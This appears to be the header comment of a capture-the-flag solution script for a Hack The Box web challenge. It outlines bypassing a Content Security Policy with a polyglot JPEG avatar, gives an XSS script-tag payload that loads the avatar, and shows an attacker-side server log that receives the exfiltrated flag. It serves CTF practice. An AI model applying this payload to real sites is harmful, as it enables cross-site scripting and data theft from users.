#Bypassing CSP using polyglot JPEGs
#https://sys3cybersecurity.netlify.app/htb-twodots-horror/
#https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs

'''
python jpg.py #generate exp.jpg
create a user named 123
upload exp.jpg as its a avatar
goto the feed page, and submit ths XSS code:
<script src="/api/avatar/123" charset="ISO-8859-1"></script>..

python2 -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
161.35.34.21 - - [16/Apr/2023 09:35:58] code 404, message File not found
161.35.34.21 - - [16/Apr/2023 09:35:58] "GET /ZmxhZz1IVEJ7VW5pdDNkX2QwdHNfMGZfcDBseWdsMHR9 HTTP/1.1" 404 -

echo ZmxhZz1IVEJ7VW5pdDNkX2QwdHNfMGZfcDBseWdsMHR9 |base64 -d
flag=HTB{Unit3d_d0ts_0f_p0lygl0t}
'''
